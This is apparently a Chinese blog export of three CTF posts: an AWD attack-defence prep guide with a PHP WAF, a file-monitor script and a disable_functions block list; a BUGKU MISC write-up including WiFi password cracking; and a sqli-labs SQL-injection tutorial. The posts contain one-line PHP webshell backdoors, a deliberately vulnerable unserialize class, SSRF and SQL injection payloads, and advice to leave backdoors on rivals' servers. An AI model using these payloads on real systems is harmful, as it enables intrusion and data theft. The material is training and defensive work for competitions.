用户名@localhost = password(&#39;新密码&#39;);</code></li><li><code>set password for user@localhost = password(&#39;123&#39;);</code></li></ul></li><li><p>修改MongoDB密码（27017端口）</p></li><li><p>修改Redis密码（6379端口）</p></li><li><p>修改网站源码中的数据库连接配置</p></li><li><p>部署waf（视情况而定）</p><ol><li><p>准备一个软waf</p></li><li><p>如何使用phpwaf.php</p><ol><li><p>找到CMS/框架通用配置文件进行包含：</p><ul><li>PHPCMS V9：<code>\phpcms\base.php</code></li><li>PHPWIND8.7：<code>\data\sql_config.php</code></li><li>DEDECMS5.7：<code>\data\common.inc.php</code></li><li>DiscuzX2：<code>\config\config_global.php</code></li><li>WordPress：<code>\wp-config.php</code></li><li>Metinfo：<code>\include\head.php</code></li></ul></li><li><p>修改php.ini文件后重启（高权限）:</p><ul><li><p>禁用敏感函数：</p><p>disable_functions = system,exec,shell_exec,passthru,proc_open,proc_close,proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,posix_getppid,posix_Tupungato,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname</p></li><li><p>自动包含waf：<br><code>auto_prepend_file = safe.php路径;</code></p></li></ul></li></ol></li><li><p>分析日志文件</p></li></ol></li><li><p>文件监控</p><ul><li>准备一个脚本，监控并删除所有新增文件。</li><li>发现内存马，直接重启php。</li><li>若监控脚本无法使用，使用命令定期查看新增与修改文件。</li><li>find web路径 -ctime -1 （查看最近一日新增的文件，是否可疑）</li></ul></li><li><p>修改目录权限：(可能会违规)</p><ul><li><code>chmod -R 644 www</code></li></ul></li></ol><p><strong>waf脚本</strong></p><pre><code class="php">&lt;?php //部署waf可能会导致服务不可用，需要谨慎部署。    error_reporting(0);    define(&#39;LOG_FILENAME&#39;,&#39;log.txt&#39;);    function waf()    {        if (!function_exists(&#39;getallheaders&#39;)) {            function getallheaders() {                foreach ($_SERVER as $name =&gt; $value) {                    if (substr($name, 0, 5) == &#39;HTTP_&#39;)                        $headers[str_replace(&#39; &#39;, &#39;-&#39;, ucwords(strtolower(str_replace(&#39;_&#39;, &#39; &#39;, substr($name, 5)))))] = $value;                }                return $headers;            }        }        $get = $_GET;        $post = $_POST;        $cookie = $_COOKIE;        $header = getallheaders();        $files = $_FILES;        $ip = $_SERVER[&quot;REMOTE_ADDR&quot;];        $method = $_SERVER[&#39;REQUEST_METHOD&#39;];        $filepath = $_SERVER[&quot;SCRIPT_NAME&quot;];        //rewirte shell which uploaded by others, you can do more        foreach ($_FILES as $key =&gt; $value) {            $files[$key][&#39;content&#39;] = file_get_contents($_FILES[$key][&#39;tmp_name&#39;]);            file_put_contents($_FILES[$key][&#39;tmp_name&#39;], &quot;virink&quot;);        }        unset($header[&#39;Accept&#39;]);//fix a bug        $input = array(&quot;Get&quot;=&gt;$get, &quot;Post&quot;=&gt;$post, &quot;Cookie&quot;=&gt;$cookie, &quot;File&quot;=&gt;$files, &quot;Header&quot;=&gt;$header);        //deal with        $pattern = &quot;select|insert|update|delete|and|or|\&#39;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex&quot;;        $pattern .= &quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;;        $pattern .=&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;;        $pattern .=&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;;        $vpattern = explode(&quot;|&quot;,$pattern);        $bool = false;        foreach ($input as $k =&gt; $v) {            foreach($vpattern as $value){                foreach ($v as $kk =&gt; $vv) {                    if (preg_match( &quot;/$value/i&quot;, $vv )){                        $bool = true;                        logging($input);                        break;                    }                }                if($bool) break;            }            if($bool) break;        }    }    function logging($var){        file_put_contents(LOG_FILENAME, &quot;\r\n&quot;.time().&quot;\r\n&quot;.print_r($var, true), FILE_APPEND);        // die() or unset($_GET) or unset($_POST) or unset($_COOKIE);    }    waf();?&gt;</code></pre><p><strong>文件监控脚本</strong></p><pre><code class="python"># -*- coding: utf-8 -*-#use: python file_check.py ./import osimport hashlibimport shutilimport ntpathimport timeCWD = os.getcwd()FILE_MD5_DICT = {}      # 文件MD5字典ORIGIN_FILE_LIST = []# 特殊文件路径字符串Special_path_str = &#39;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#39;bakstring = &#39;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#39;logstring = &#39;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;webshellstring = &#39;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#39;difffile = &#39;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#39;Special_string = &#39;drops_log&#39;  # 免死金牌UNICODE_ENCODING = &quot;utf-8&quot;INVALID_UNICODE_CHAR_FORMAT = r&quot;\?%02x&quot;# 文件路径字典spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))Special_path = {    &#39;bak&#39; : os.path.realpath(os.path.join(spec_base_path, bakstring)),    &#39;log&#39; : os.path.realpath(os.path.join(spec_base_path, logstring)),    &#39;webshell&#39; : os.path.realpath(os.path.join(spec_base_path, webshellstring)),    &#39;difffile&#39; : os.path.realpath(os.path.join(spec_base_path, difffile)),}def isListLike(value):    return isinstance(value, (list, tuple, set))# 获取Unicode编码def getUnicode(value, encoding=None, noneToNull=False):    if noneToNull and value is None:        return NULL    if isListLike(value):        value = list(getUnicode(_, encoding, noneToNull) for _ in value)        return value    if isinstance(value, unicode):        return value    elif isinstance(value, basestring):        while True:            try:                return unicode(value, encoding or UNICODE_ENCODING)            except UnicodeDecodeError, ex:                try:                    return unicode(value, UNICODE_ENCODING)                except:                    value = value[:ex.start] + &quot;&quot;.join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]    else:        try:            return unicode(value)        except UnicodeDecodeError:            return unicode(str(value), errors=&quot;ignore&quot;)# 目录创建def mkdir_p(path):    import errno    try:        os.makedirs(path)    except OSError as exc:        if exc.errno == errno.EEXIST and os.path.isdir(path):            pass        else: raise# 获取当前所有文件路径def getfilelist(cwd):    filelist = []    for root,subdirs, files in os.walk(cwd):        for filepath in files:            originalfile = os.path.join(root, filepath)            if Special_path_str not in originalfile:                filelist.append(originalfile)    return filelist# 计算机文件MD5值def calcMD5(filepath):    try:        with open(filepath,&#39;rb&#39;) as f:            md5obj = hashlib.md5()            md5obj.update(f.read())            hash = md5obj.hexdigest()            return hash    except Exception, e:        print u&#39;[!] getmd5_error : &#39; + getUnicode(filepath)        print getUnicode(e)        try:            ORIGIN_FILE_LIST.remove(filepath)            FILE_MD5_DICT.pop(filepath, None)        except KeyError, e:            pass# 获取所有文件MD5def getfilemd5dict(filelist = []):    filemd5dict = {}    for ori_file in filelist:        if Special_path_str not in ori_file:            md5 = calcMD5(os.path.realpath(ori_file))            if md5:                filemd5dict[ori_file] = md5    return filemd5dict# 备份所有文件def backup_file(filelist=[]):    # if len(os.listdir(Special_path[&#39;bak&#39;])) == 0:    for filepath in filelist:        if Special_path_str not in filepath:            shutil.copy2(filepath, Special_path[&#39;bak&#39;])if __name__ == &#39;__main__&#39;:    print u&#39;---------start------------&#39;    for value in Special_path:        mkdir_p(Special_path[value])    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件    ORIGIN_FILE_LIST = getfilelist(CWD)    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG    print u&#39;[*] pre work end!&#39;    while True:        file_list = getfilelist(CWD)        # 移除新上传文件        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))        if len(diff_file_list) != 0:            # import pdb;pdb.set_trace()            for filepath in diff_file_list:                try:                    f = open(filepath, &#39;r&#39;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#39;[*] webshell find : &#39; + getUnicode(filepath)                        shutil.move(filepath, os.path.join(Special_path[&#39;webshell&#39;], ntpath.basename(filepath) + &#39;.txt&#39;))                    except Exception as e:                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filepath)                    try:                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)                        f.write(&#39;newfile: &#39; + getUnicode(filepath) + &#39; : &#39; + str(time.ctime()) + &#39;\n&#39;)                        f.close()                    except Exception as e:                        print u&#39;[-] log error : file move error: &#39; + getUnicode(e)        # 防止任意文件被修改,还原被修改文件        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)        for filekey in md5_dict:            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:                try:                    f = open(filekey, &#39;r&#39;).read()                except Exception, e:                    break                if Special_string not in f:                    try:                        print u&#39;[*] file had be change : &#39; + getUnicode(filekey)                        shutil.move(filekey, os.path.join(Special_path[&#39;difffile&#39;], ntpath.basename(filekey) + &#39;.txt&#39;))                        shutil.move(os.path.join(Special_path[&#39;bak&#39;], ntpath.basename(filekey)), filekey)                    except Exception as e:                        print u&#39;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#39;%getUnicode(filekey)                    try:                        f = open(os.path.join(Special_path[&#39;log&#39;], &#39;log.txt&#39;), &#39;a&#39;)                        f.write(&#39;diff_file: &#39; + getUnicode(filekey) + &#39; : &#39; + getUnicode(time.ctime()) + &#39;\n&#39;)                        f.close()                    except Exception as e:                        print u&#39;[-] log error : done_diff: &#39; + getUnicode(filekey)                        pass        time.sleep(2)        # print &#39;[*] &#39; + getUnicode(time.ctime())</code></pre><h3 id="4、攻防演练："><a href="#4、攻防演练：" class="headerlink" title="4、攻防演练："></a>4、攻防演练：</h3><h4 id="如何获得flag？"><a href="#如何获得flag？" class="headerlink" title="如何获得flag？"></a>如何获得flag？</h4><p>在实际比赛中，一般有两种方式获取flag，一种是先获取webshell权限，然后去读flag文件，另一种则是直接通过漏洞读取flag文件。</p><ul><li>Getshell：<ul><li>官方后门、文件上传</li><li>文件写入、文件包含</li><li>命令注入、反序列化</li><li>Redis写shell</li><li>Mysql写shell</li></ul></li><li>直接读文件：<ul><li>SSRF</li><li>任意文件读取</li><li>XXE</li><li>文件包含</li><li>Sqli</li></ul></li></ul><h5 id="1-web后门："><a href="#1-web后门：" class="headerlink" title="1. web后门："></a>1. web后门：</h5><p>在任意APP的某个文件的源码中加上一句话后门。</p><ul><li>@eval($_POST[‘XXX’]);</li><li>@assert($_POST[‘XXX’]);</li><li>system($_REQUEST[‘CMD’]);</li></ul><p>对于这种类型的漏洞，只要用正则遍历匹配就能找到<br><code>grep -r &quot;eval\(\$_&quot;</code><br>或者还有一些复杂变异的后门，这种情况就可以选择使用D盾Webshell查杀或者SafeDog之类的工具对源码进行扫描。只要删掉就可以解决。</p><h5 id="2-系统后门"><a href="#2-系统后门" class="headerlink" title="2. 系统后门"></a>2. 系统后门</h5><ul><li>NC后门</li><li>SSH后门</li><li>suid后门</li></ul><h5 id="3-webshell："><a href="#3-webshell：" class="headerlink" title="3. webshell："></a>3. webshell：</h5><ul><li>内存马：不断生成shell文件</li><li>Webshell密码：给Webshell增加密码，增加一个password参数MD5</li></ul><h5 id="4-文件上传："><a href="#4-文件上传：" class="headerlink" title="4. 文件上传："></a>4. 文件上传：</h5><ul><li><p>put方法：</p><p>Tomcat远程代码执行漏洞分析(CVE-2017-12615)</p></li></ul><ul><li><p>一般上传：</p><ul><li>各种绕过方式一定要熟悉</li><li>常见改包、解析漏洞、图片渲染、逻辑文件（双文件上传）、条件竞争</li><li>防护方式——白名单、禁止上传目录执行权限、上传于Web目录外</li></ul></li></ul><h5 id="5-文件写入："><a href="#5-文件写入：" class="headerlink" title="5. 文件写入："></a>5. 文件写入：</h5><ul><li><p>缓存：</p><ul><li>存在缓存机制，后缀名为php，直接代码执行。</li></ul><p>-配置文件：</p><ul><li>单引号内：输入单引号，尝试逃逸。如<code>&#39;+@phpinfo()+&#39;</code></li><li>双引号内：输入会被解析的符号。如<code>${@phpinfo()}</code></li></ul></li><li><p>模板文件：</p><ul><li>模板被包含，getshell。</li><li>创建新文件时无校验后缀名。</li></ul></li><li><p>日志：</p><ul><li>日志以php后缀保存，X-Forwarded-For来伪造ip植入木马。</li></ul></li></ul><h5 id="6-命令注入-反序列化："><a href="#6-命令注入-反序列化：" class="headerlink" title="6. 命令注入/反序列化："></a>6. 命令注入/反序列化：</h5><p>PHP中使用unserialize函数对数据进行反序列化，反序列化过程类的<strong>wakeup方法与</strong>destruct方法会被调用。</p><pre><code class="php">&lt;?phpclass TestClass{    public $variable;    public function __destruct()    {        print_r(shell_exec(&quot;ping &quot;.$this-&gt;variable));        }}unserialize($_GET[&#39;data&#39;]);?&gt;</code></pre><h5 id="7-文件读取："><a href="#7-文件读取：" class="headerlink" title="7. 文件读取："></a>7. 文件读取：</h5><ul><li><p>SSRF：存在服务器请求伪造漏洞时，可使用file协议读取本地文件。</p><p><code>http://127.0.0.1/read.php?url=file:///flag</code></p><pre><code class="php"></code></pre></li><li><p>SQL注入：目标存在SQL注入时，可尝试直接读取flag。</p></li></ul><ul><li><p>常规注入、盲注、二次注入、insert注入、http头注入</p></li><li><p>读取<br><code>select load_file()</code></p></li><li><p>写入<br><code>select outfile()</code><br><code>select dumpfile()</code></p></li></ul><h5 id="8-困难漏洞："><a href="#8-困难漏洞：" class="headerlink" title="8. 困难漏洞："></a>8. 困难漏洞：</h5><p><strong>有时候出题者会直接丢一个0day，现场审计。找不到漏洞没关系，上Waf保平安，时刻关注你的日志记录，NPC也会打出攻击流量。</strong></p><p><strong>找到别人写在自己服务器上的shell，一般其他服务器也会有，可以去留后门。</strong></p><p>Collected by 此名如此彪悍</p><p>如有侵权，请敬请告知！！联系方式qq：1739381035</p>]]></content>
      
      
      <categories>
          
          <category> 线下赛 </category>
          
          <category> AWD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 准备 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUGKU做题总结(一)</title>
      <link href="/2019/06/18/BUGKU%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93(%E4%B8%80)/"/>
      <url>/2019/06/18/BUGKU%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<p>最近抽出一点时间练了一些BUGKU练习平台的MISC题，又学到了一些知识，感觉很好。现在总结一下当时没有立刻做出的、并有的借鉴大佬的题，加深加深自己的做题印象。</p><h3 id="MISC1-啊哒"><a href="#MISC1-啊哒" class="headerlink" title="MISC1(啊哒)"></a>MISC1(啊哒)</h3><p><strong>本题主要是数据隐藏</strong></p><p>先看题目</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYzMzN2VmOGRmNzljMjJlMS5qcGc" alt></p><p>额，没什么有用信息。那下载题目文件，发现是压缩包。用winrar打开，发现了一张jpg图片。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYTlhYjBkYWZkMTkxNjRkNS5qcGc" alt></p><p>图片。。。一般遇到图片，先查看属性看是否有隐藏信息。然后用winhex打开，我发现这个地方竟如此可疑。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZWQ0NTFmOGNhODljZTFjNS5wbmc" alt></p><p>当然，用记事本打开会更加明显，亲测。。。很明显这是十六进制，十六进制转字符串一波走起。。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvOGEyODI2YmQ2Y2QwNDdhMC5qcGc" alt></p><p>提交然而并不对。于是思考尝试后发现ada.jpg用winrar打开</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZTM3YjkzZTU1MWYxN2M5NC5qcGc" alt></p><p>很明显，刚才得到的字符串应该就是这个加密文件的密码了。果然如此，输入密码解压文件得到</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZWNjYmU3NTMyNzcwM2Y4Ni5qcGc" alt></p><h3 id="MISC2-宽带信息泄露"><a href="#MISC2-宽带信息泄露" class="headerlink" title="MISC2(宽带信息泄露)"></a>MISC2(宽带信息泄露)</h3><p><strong>本题主要是查看路由器备份的配置文件</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYTdhYTMyZDcxMjhkZmZkMy5qcGc" alt></p><p>看题目提示，emmm。。题目看起来似乎好难。下载题目文件。只有一个conf.bin文件，并且打不开。分析工具用了一波，然而并没有获取到有用信息。。。。于是查百度、查谷歌。。</p><p>了解到：<strong>路由器备份的配置文件一般是.bin格式，默认名称通常是conf.bin，通常用“RouterPass”路由器工具打开bin文件。</strong></p><p>于是当然是下载工具了。下载后打开题目文件</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMTA1Zjk2YjBhYTdlMmJkOS5qcGc" alt></p><p>然后不断翻找有用信息，发现宽带用户名了。。。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNDkyNTA0YTg2OGQ3NTQxOS5qcGc" alt></p><p>然后按格式提交就行了。。。</p><h3 id="MISC3-come-game"><a href="#MISC3-come-game" class="headerlink" title="MISC3(come_game)"></a>MISC3(come_game)</h3><p><strong>本题主要是脑洞和信息发现</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kxLmZ1aW1nLmNvbS82OTAzNzQvNzZjMzU5MDgxMGYyYjk1ZS5qcGc" alt></p><p>看题目了解到，这道题应该是和游戏有关，并且要通关才有flag。下载题目文件，解压，得到一个.exe可执行文件。运行，发现果然这是个游戏。。。。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNzY2ZDY2MTlmOWZkNjhlNi5qcGc" alt></p><p>在玩之后发现，生成了名字为save1、temp、DeathTime三个文件。分别用notepad++打开后发现，save1有点特殊</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZmRlNjdlYjNlN2IxYTcyYS5qcGc" alt></p><p>想到可能这个2，就是通关关卡数，改为5，打开游戏。果然如此，通关获取到flag了！。。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNzAxYzBjYWUxZmE0Yjg3My5qcGc" alt></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNzU0NTBiMjhjY2Q5NzI4ZS5qcGc" alt></p><p>解题完毕，此题结束。。</p><h3 id="MISC4-linux"><a href="#MISC4-linux" class="headerlink" title="MISC4(linux)"></a>MISC4(linux)</h3><p><strong>本题主要是linux系统的常用命令使用</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYTYzN2M2MTJjYWQwOTdmOC5qcGc" alt></p><p>看到题目，了解到需要linux系统的命令操作。好在我提前已经装过linux虚拟机。那先了解一下<a href="https://www.cnblogs.com/crazylqy/p/5818745.html" target="_blank" rel="noopener">linux常用基础命令</a></p><p>||<a href="https://www.cnblogs.com/dunitian/p/4822807.html" target="_blank" rel="noopener">Linux基础命令</a>吧。</p><p>了解完之后，开始继续做题吧！下载题目文件，得到1.tar .gz。打开发现文档flag。所以用<code>cat</code>由第一行开始显示档案内容。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvN2IwYzg1ZjRkYTM1ZjNkYi5wbmc" alt></p><p>这个就应该是所谓的flag了。。。提交，果然是。</p><h3 id="MISC5-做个游戏-08067CTF"><a href="#MISC5-做个游戏-08067CTF" class="headerlink" title="MISC5(做个游戏(08067CTF))"></a>MISC5(做个游戏(08067CTF))</h3><p><strong>本题主要是java反编译</strong></p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNTE0MDZjZjljMTNkNzFiNy5qcGc" alt></p><p>看题目的意思知道，这道题又是一个游戏，并且要求坚持60秒才有flag。然后下载文件，然后打开，发现果然是个游戏。那就开始玩吧。。移动白色方块，避免被撞击，发现可以移动到永远不被撞击的地方哎。然而，等了60秒并没有什么用。。。。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZGJiZTdjNzcxODZiZjgzNC5qcGc" alt></p><p>然后，想其他方法了。发现heiheihei.jar用winrar打开，发现了一些图片。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvM2MzYjA0ZTUzYTFlNmE1Ni5qcGc" alt></p><p>于是我尝试只留第一张，其他全移走。结果发现</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvMDc0MmE4MzNiN2QyZTkwOC5qcGc" alt></p><p>显示flag了，然而并没有完全显示完。emmmmm。。。。。既然显示了，那应该在java程序中能找到。百度或谷歌一下，发现有个java反编译工具JD-GUI。下载用下，然而我不知什么原因，并没有下载成功。于是下载了相似工具。用java反编译工具直接打开jar文件，发现并没有有用信息。于是先用winrar打开jar文件，用java反编译工具打开相应组成文件。。。发现flag了。。。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYmU3OTQxOWQ4OGIxNGQ4Zi5qcGc" alt></p><p>直接提交，发现并不对，发现花括号里的应该Base64加密了。解密后提交，成功了。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvODdhM2ZjNjdkMWVkMDBkNS5qcGc" alt></p><h3 id="MISC6-想蹭网先解开密码"><a href="#MISC6-想蹭网先解开密码" class="headerlink" title="MISC6(想蹭网先解开密码)"></a>MISC6(想蹭网先解开密码)</h3><p><strong>本题主要是了解wifi认证WPA的四次握手包，并根据已给信息生成密码字典破解密码。</strong></p><p><strong>了解</strong>：wifi握手包,即采用WPA加密方式的无线AP与无线客户端进行连接前的认证信息包</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYzhjOGE2NTkxNzYzMDFmYi5qcGc" alt></p><p>这道题我参考了大佬的博客做的。了解到通过握手包(此题是wifi.cap)便可以对密码进行暴力猜解。题目已经给了前七位。那由此生成一个密码词典吧！于是找了个脚本:</p><p>生成字典文件</p><pre><code class="python">f=open(&#39;pass.txt&#39;,&#39;w&#39;)for i in range(0,10000):    psd=&#39;1391040&#39;+str(i).zfill(4)    f.write(psd+&#39;\n&#39;)</code></pre><p>然后用到软件 EWSA导入字典文件，进行暴力猜解，就行了。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvYzk5YjExYjY0OGQxOTk2NS5qcGc" alt></p><p>emmmm。。。星号是什么鬼。。。不知到怎么才能显示。换另一种方式解题吧。。。。不想叙述了，有个大佬总结的比较详细，可以<a href="https://www.cnblogs.com/leixiao-/p/9825066.html" target="_blank" rel="noopener">参考</a>一下。。<br>还有个<a href="https://www.cnblogs.com/Gzu_zb/p/10349362.html" target="_blank" rel="noopener">linux系统的解题方式</a>吧。</p><p>总结结束，参考一些知识和大佬的博客，又收获了好多。。<br>继续努力。。。小白进阶ing</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BUGKU </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqli-labs攻关1(Less-1_Less-6)</title>
      <link href="/2019/06/10/sqli-labs%E6%94%BB%E5%85%B31(Less-1_Less-6)/"/>
      <url>/2019/06/10/sqli-labs%E6%94%BB%E5%85%B31(Less-1_Less-6)/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>为了更好的学习和练习有关SQL注入的知识,于是我开启了sqli-labs的通关之路。。。。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNzIwYjgyNDY5MWQ3MzY5NC5wbmc" alt></p><p><strong>为了方便学习查看，我在源码中的$sql下一句语句写以下php语句（就是输出拿到数据库查询的完整语句是怎么样的）</strong></p><pre><code class="php">echo &quot;你的 sql 语句是：&quot;.$sql.&quot;&lt;br&gt;&quot;;</code></pre><p>在开始注入之前，我学习了下面这些相关sql注入基础知识。</p><h3 id="sql注入基础知识"><a href="#sql注入基础知识" class="headerlink" title="sql注入基础知识"></a>sql注入基础知识</h3><h4 id="1-判断是否存在sql注入"><a href="#1-判断是否存在sql注入" class="headerlink" title="1.判断是否存在sql注入"></a>1.判断是否存在sql注入</h4><p><strong>1、get 单引号判断</strong><br><code>?id=1&#39;</code> 如果报错说明存在sql注入<br>输入<code>?id=1</code>显示正常<br>输入<code>?id=1&#39;</code>显示错误，所以就存在sql注入<br><code>&#39;</code>的url编码是<code>%27</code></p><p><strong>2、get and判断</strong><br>输入<code>?id=-1&#39;and 1=1</code> 正常<br>输入<code>?id=-1&#39;and 1=2</code> 报错<br>如果报错，那就存在sql；但由于mysql版本问题，2个都存在报错，所欲还是要看具体报错。才能更具报错内容进一步判断是否存在sql注入。</p><p><strong>3、Or、xor判断</strong><br><code>or</code> <code>xor</code>方法和<code>and</code>方法一致。<br><strong>4、sql运算符判断</strong><br>输入<code>?id=5-0</code><br>输入<code>?id=5-1</code><br>输入<code>?id=5+1</code><br>通过匹对获取到的内容是否一致，不一致代表存在sql注入；</p><p><strong>5、通过sleep函数演示显示的形式进行判断</strong><br>payload</p><pre><code class="sql">?id=1&#39; and if(left(database(),1)=&#39;s&#39;,sleep(5),1)--+</code></pre><p><em>表示5秒后响应内容</em></p><p><strong>6、服务端返回错误形式</strong><br>错误直接回显在页面上<br>错误隐藏在页面源代码中<br>检测到错误跳转到另一个页面<br>返回HTTP错误代码500或重定向302<br>适当处理错误结果，常显示一个通用错误页面</p><h4 id="2-post、get、编码"><a href="#2-post、get、编码" class="headerlink" title="2.post、get、编码"></a>2.post、get、编码</h4><p>常用<code>&#39;or and 1=1 #</code> <code>&#39;or and 1=1 –-+</code></p><p><code>#</code>是sql语句中的注释符；</p><p><code>+</code> 在http请求中表示空格；</p><p><code>--</code> 后面的语句相当于被注释掉,不执行后面的sql语句；</p><p><code>--+</code>代表闭合sql查询语句，如果没加，无法形成有效的mysql语句，这是sql注入中常见的巧妙运用。</p><p><strong>在post参数中</strong><br>要加空格符，直接输入空格服即可；用<code>+</code>会被http请求转义为<code>%2B</code>编码；<br><strong>在get请求中</strong><br>在get请求中如果有空格，需要用空格符编码<code>%20</code>来替代，不然会请求报错；<br>如果用<code>#</code>表示不提交<code>#</code>后面的参数到服务端，但是转成<code>%23</code>编码就可以提交过去；<br><strong>常见URL编码</strong><br>空格 <code>%20</code> +<code>%2b</code> &lt;<code>%3c</code> &gt;<code>%3e</code></p><p>更多参考<a href="https://www.w3school.com.cn/tags/html_ref_urlencode.html" target="_blank" rel="noopener">https://www.w3school.com.cn/tags/html_ref_urlencode.html</a><br>或者工具查询<a href="https://tool.chinaz.com/tools/urlencode.aspx" target="_blank" rel="noopener">https://tool.chinaz.com/tools/urlencode.aspx</a></p><p>神奇的编码可以进行各种绕过！！</p><h4 id="3-sql注入常用mysql函数"><a href="#3-sql注入常用mysql函数" class="headerlink" title="3.sql注入常用mysql函数"></a>3.sql注入常用mysql函数</h4><p><strong>1、order by</strong><br>该函数用于对结果集进行排序，主要用于猜字段。<br>例如我们在实验室less-1<br>输入<code>?id=1</code>要确定它里面有多少个字段，就要用到order by了<br>例如输入<code>?id=1 order by 3 --+</code> 显示正常<br>再次输入<code>?id=1 order by 4 --+</code> 显示错误<br>所以的出，在<code>?id=1</code>查看的这个表有3个字段</p><p><strong>2、union</strong><br>union在sql注入测试过程中，几乎经常用到，进行联合查询</p><p>例：<br><code>?id=-1&#39; union select 1,user(),database() --+</code></p><p><strong>3、MID</strong><br><code>SELECT MID(ColumnName, Start [, Length]) FROM TableName</code><br><strong>4、LEFT(str,len)</strong><br>返回字符串str的最左面len个字符<br><strong>5、ASCII(str) =ORD</strong><br>返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL<br><strong>6、SUBSTR(str,pos,len)</strong><br>从str中多少个字符开始，截取多少位<br><strong>7、CAST</strong><br><code>SELECT CAST(’12’ AS int)</code> 